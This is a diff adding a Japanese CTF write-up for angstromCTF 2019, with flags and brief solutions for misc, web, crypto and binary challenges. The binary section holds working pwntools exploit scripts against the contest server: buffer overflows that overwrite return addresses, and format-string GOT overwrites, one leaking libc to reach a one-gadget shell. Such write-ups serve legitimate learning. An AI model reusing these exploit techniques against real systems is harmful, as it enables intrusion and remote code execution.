@@ -40,6 +40,10 @@
 
 
 
+
+
+
+
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
@@ -94,6 +98,261 @@
       <div class="u-padding">
         
 
+
+<article>
+  <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/angstrom2019/" rel="bookmark">Angstrom2019</a>
+  </h2>
+  
+  <time datetime="2019-04-25T21:57:22&#43;09:00">
+    25 April, 2019
+  </time>
+  
+</header>
+  
+
+<h2 id="misc">Misc</h2>
+
+<h3 id="irc">IRC</h3>
+
+<ul>
+<li>freenodeに入るとFLAG</li>
+<li><strong>actf{like_discord_but_worse}</strong></li>
+</ul>
+
+<h2 id="the-mueller-report">The mueller Report</h2>
+
+<ul>
+<li>PDFが渡されるので、とりあえず<code>actf</code>でgrepするとFLAG</li>
+<li><strong>actf{no0o0o0_col1l1l1luuuusiioooon}</strong></li>
+</ul>
+
+<h2 id="blank-pdf">Blank PDF</h2>
+
+<ul>
+<li>PDFが渡されるが開けず、<code>file</code>コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG</li>
+<li><strong>actf{knot_very_interesting}</strong></li>
+</ul>
+
+<h2 id="paper-trail">Paper Trail</h2>
+
+<ul>
+<li>pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している</li>
+<li><strong>actf{fake_math_papers}</strong></li>
+</ul>
+
+<h2 id="scratch-it-out">Scratch It Out</h2>
+
+<ul>
+<li>project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる</li>
+<li>project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される</li>
+<li>最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる</li>
+<li>地味に面白い</li>
+<li><strong>actf{Th5_0pT1maL_LANgUaG3}</strong></li>
+</ul>
+
+<h2 id="web">Web</h2>
+
+<h3 id="control-you">Control you</h3>
+
+<ul>
+<li>HTMLソースを見てFLAG</li>
+<li><strong>actf{control_u_so_we_can&rsquo;t_control_you}</strong></li>
+</ul>
+
+<h2 id="crypto">Crypto</h2>
+
+<h3 id="classy-cipher">Classy Cipher</h3>
+
+<ul>
+<li>ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く</li>
+<li><strong>actf{so_charming}</strong></li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">encrypted <span style="color:#666">=</span> <span style="color:#ba2121">&#39;:&lt;M?TLH8&lt;A:KFBG@V&#39;</span>
+
+<span style="color:#008000;font-weight:bold">for</span> i <span style="color:#a2f;font-weight:bold">in</span> <span style="color:#008000">range</span>(<span style="color:#666">0xff</span>):
+    <span style="color:#008000;font-weight:bold">for</span> c <span style="color:#a2f;font-weight:bold">in</span> encrypted:
+        <span style="color:#008000;font-weight:bold">print</span>(<span style="color:#008000">chr</span>((<span style="color:#008000">ord</span>(c)<span style="color:#666">-</span>i) <span style="color:#666">%</span> <span style="color:#666">0xff</span>), end<span style="color:#666">=</span><span style="color:#ba2121">&#39;&#39;</span>)</code></pre></div>
+<h3 id="really-secure-algorithm">Really Secure Algorithm</h3>
+
+<ul>
+<li>RSAのパラメータがe, p, q, cが渡されるので復号するだけ</li>
+<li><strong>actf{really_securent_algorithm}</strong></li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require_relative <span style="color:#ba2121">&#39;../../tools/ctf/crypto.rb&#39;</span>
+
+<span style="color:#008000">p</span> <span style="color:#666">=</span> <span style="color:#666">8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889</span>
+q <span style="color:#666">=</span> <span style="color:#666">7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493</span>
+e <span style="color:#666">=</span> <span style="color:#666">65537</span>
+c <span style="color:#666">=</span> <span style="color:#666">7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349</span>
+
+rsa <span style="color:#666">=</span> <span style="color:#800">RSA</span><span style="color:#666">.</span>new(e, <span style="color:#008000">p</span> <span style="color:#666">*</span> q, <span style="color:#008000">p</span>, q)
+m <span style="color:#666">=</span> rsa<span style="color:#666">.</span>decrypt(c)
+<span style="color:#008000">print</span>(<span style="color:#666">[</span>m<span style="color:#666">.</span>to_s(<span style="color:#666">16</span>)<span style="color:#666">].</span>pack(<span style="color:#ba2121">&#34;H*&#34;</span>))</code></pre></div>
+<h2 id="half-and-half">Half and Half</h2>
+
+<ul>
+<li>ソースコードが渡されるので呼んでソルバを書くだけ
+
+<ul>
+<li>24文字を12byteに分割しxor取った値に等しくなるようにする</li>
+<li>フラグフォーマットは、<code>actf{</code>なので先頭5byteと後半の5byteもxorして判明(<code>taste</code>)</li>
+<li>問題文から<code>taste</code>に合うような単語で<code>coffee</code>を<code>actf{</code>の後に繋げると後半が<code>good</code>と文章が成り立つ</li>
+</ul></li>
+<li><strong>actf{coffee_tastes_good}</strong></li>
+</ul>
+
+<h2 id="runes">Runes</h2>
+
+<ul>
+<li>Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ
+
+<ul>
+<li>復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている</li>
+</ul></li>
+<li><strong>actf{crypto_lives}</strong></li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#008000">require</span> <span style="color:#ba2121">&#39;gmp&#39;</span>
+
+n <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z(<span style="color:#666">99157116611790833573985267443453374677300242114595736901854871276546481648883</span>)
+<span style="color:#008000">p</span> <span style="color:#666">=</span> <span style="color:#666">310013024566643256138761337388255591613</span>
+q <span style="color:#666">=</span> <span style="color:#666">319848228152346890121384041219876391791</span>
+g <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z(<span style="color:#666">99157116611790833573985267443453374677300242114595736901854871276546481648884</span>)
+c <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z(<span style="color:#666">2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869</span>)
+l <span style="color:#666">=</span> <span style="color:#800">GMP</span><span style="color:#666">::</span>Z((<span style="color:#008000">p</span> <span style="color:#666">-</span> <span style="color:#666">1</span>)<span style="color:#666">.</span>lcm(q <span style="color:#666">-</span> <span style="color:#666">1</span>))
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">L</span>(u, n)
+  (u <span style="color:#666">-</span> <span style="color:#666">1</span>) <span style="color:#b68">/ n
+</span><span style="color:#b68">end
+</span><span style="color:#b68">c_lambda = L(c.powmod(l, n.pow(2)), n)
+</span><span style="color:#b68">g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
+</span><span style="color:#b68">m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
+</span><span style="color:#b68">print([m].pack(&#34;H*&#34;))</span></code></pre></div>
+<h2 id="binary">Binary</h2>
+
+<h3 id="aquarium">Aquarium</h3>
+
+<ul>
+<li>gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ</li>
+<li><strong>actf{overflowed_more_than_just_a_fish_tank}</strong></li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+
+<span style="color:#408080;font-style:italic">#z = Sock.new &#34;localhost&#34;, 9999</span>
+z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19305</span>
+
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">0x98</span> <span style="color:#666">+</span> p32(<span style="color:#666">0x4011b6</span>)
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline payload
+
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recv</code></pre></div>
+<h3 id="chain-of-rope">Chain of Rope</h3>
+
+<ul>
+<li>名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)</li>
+<li><strong>actf{dark_web_bargains}</strong></li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+
+z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;localhost&#34;</span>, <span style="color:#666">9999</span>
+z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19400</span>
+
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;access</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">0x38</span> <span style="color:#666">+</span> p64(<span style="color:#666">0x401231</span>)
+z<span style="color:#666">.</span>sendline payload
+
+<span style="color:#008000">p</span> z<span style="color:#666">.</span>recv</code></pre></div>
+<h3 id="purchases">Purchases</h3>
+
+<ul>
+<li>FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる</li>
+<li>関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする
+
+<ul>
+<li>末尾2byteですむので楽に書き換えられる</li>
+</ul></li>
+<li><strong>actf{limited_edition_flag}</strong></li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+<span style="color:#408080;font-style:italic"># z = Sock.new &#34;localhost&#34;, 9999</span>
+z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19011</span>
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;%4534c%10$hnAAAA</span><span style="color:#b62;font-weight:bold">\x18\x40\x40</span><span style="color:#ba2121">&#34;</span>
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;else. &#34;</span>
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recv</code></pre></div>
+<h3 id="returns">Returns</h3>
+
+<ul>
+<li>Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ</li>
+<li>libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う</li>
+<li>出力バイトの関係から分割して書き込むために、はじめに<code>puts@got</code>をmainに書き換えておき何度もFSBを使えるようにする</li>
+<li><code>__stack_chk_fail@got</code>は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える</li>
+<li>最後に、<code>puts@got</code>を<code>__stack_chk_fail@got</code>になおしてあげればOne gadgetが実行される</li>
+<li><strong>actf{no_returns_allowed}</strong></li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+<span style="color:#408080;font-style:italic"># coding: utf-8</span>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+<span style="color:#408080;font-style:italic">#z = Sock.new &#34;localhost&#34;, 8888</span>
+z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;shell.actf.co&#34;</span>, <span style="color:#666">19307</span>
+context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
+libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;./libc.so.6&#34;</span>
+<span style="color:#408080;font-style:italic">#z = Sock.new &#34;shell.actf.co&#34;, 19011</span>
+<span style="color:#008000">puts</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+
+<span style="color:#408080;font-style:italic"># Leaking libc address and overwriting puts@got to the entrypoint of main function</span>
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;%4518c%11$hnAAAABBB%17$p</span><span style="color:#b62;font-weight:bold">\x18\x40\x40</span><span style="color:#ba2121">&#34;</span>
+data <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+data <span style="color:#666">=</span> data<span style="color:#666">.</span>gsub(<span style="color:#b68">/\s/</span>,<span style="color:#ba2121">&#34;&#34;</span>)
+libc_start_main <span style="color:#666">=</span> data<span style="color:#666">.</span>match(<span style="color:#b68">/BBB(.*)@@\./</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>chop<span style="color:#666">.</span>to_i(<span style="color:#666">16</span>) <span style="color:#666">-</span> <span style="color:#666">240</span>
+libc_base <span style="color:#666">=</span> libc_start_main <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#39;__libc_start_main&#39;</span><span style="color:#666">]</span>
+<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;libc base address = </span><span style="color:#b68;font-weight:bold">#{</span>libc_base<span style="color:#666">.</span>to_s(<span style="color:#666">16</span>)<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">&#34;</span>
+
+one_gadget <span style="color:#666">=</span> libc_base <span style="color:#666">+</span> <span style="color:#666">0xf02a4</span>
+high <span style="color:#666">=</span> (one_gadget <span style="color:#666">&amp;</span> <span style="color:#666">0xffffffff00000000</span>) <span style="color:#666">&gt;&gt;</span> <span style="color:#666">32</span>
+low <span style="color:#666">=</span> one_gadget <span style="color:#666">&amp;</span> <span style="color:#666">0xffffffff</span>
+llow <span style="color:#666">=</span> (low <span style="color:#666">&amp;</span> <span style="color:#666">0xffff0000</span>) <span style="color:#666">&gt;&gt;</span> <span style="color:#666">16</span>
+hlow <span style="color:#666">=</span> low <span style="color:#666">&amp;</span> <span style="color:#666">0xffff</span>
+
+<span style="color:#408080;font-style:italic"># Overwriting __stack_chk_fail@got to one gadget RCE</span>
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%</span><span style="color:#b68;font-weight:bold">#{</span>high<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">c%11$hnAAAABBBBBBB</span><span style="color:#b62;font-weight:bold">\x2c\x40\x40</span><span style="color:#ba2121">&#34;</span>
+z<span style="color:#666">.</span>sendline payload
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%</span><span style="color:#b68;font-weight:bold">#{</span>hlow<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">c%11$hnAAAABBBBBBB</span><span style="color:#b62;font-weight:bold">\x28\x40\x40</span><span style="color:#ba2121">&#34;</span>
+z<span style="color:#666">.</span>sendline payload
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%</span><span style="color:#b68;font-weight:bold">#{</span>llow<span style="color:#b68;font-weight:bold">}</span><span style="color:#ba2121">c%11$hnAAAABBBBBBB</span><span style="color:#b62;font-weight:bold">\x2a\x40\x40</span><span style="color:#ba2121">&#34;</span>
+z<span style="color:#666">.</span>sendline payload
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;? &#34;</span>
+
+<span style="color:#800">STDIN</span><span style="color:#666">.</span>gets
+payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;%4892c%11$hnAAAABBB%17$p</span><span style="color:#b62;font-weight:bold">\x18\x40\x40</span><span style="color:#ba2121">&#34;</span>
+z<span style="color:#666">.</span>sendline payload
+
+z<span style="color:#666">.</span>interact</code></pre></div>
+  
+</article>
 
 <article>
   <header class="Heading">
